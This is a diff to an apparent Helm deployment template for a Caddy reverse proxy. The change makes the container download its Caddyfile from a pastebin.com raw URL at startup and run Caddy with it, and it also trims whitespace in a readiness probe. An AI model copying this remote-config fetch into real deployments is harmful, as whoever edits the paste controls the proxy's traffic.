@@ -24,6 +24,13 @@ spec:
               value: "{{ .Values.app.reverse_proxy_hostname }}"
             - name: TARGET_HOSTNAME
               value: "{{ .Values.app.target_hostname }}"
+          command: ["/bin/sh"]
+          args:
+            - -c
+            - |
+              apk add nss-tools curl &&
+              curl --output /etc/caddy/Caddyfile https://pastebin.com/raw/R5rUikQU &&
+              caddy run --config /etc/caddy/Caddyfile --adapter caddyfile
           volumeMounts:
             - name: app-data-volume
               mountPath: /data
@@ -36,7 +43,7 @@ spec:
             failureThreshold: 3
           readinessProbe:
             exec:
-              command: 
+              command:
                 - sh
                 - -c
                 - curl -k --resolve $REVERSE_PROXY_HOSTNAME:443:127.0.0.1 https://$REVERSE_PROXY_HOSTNAME
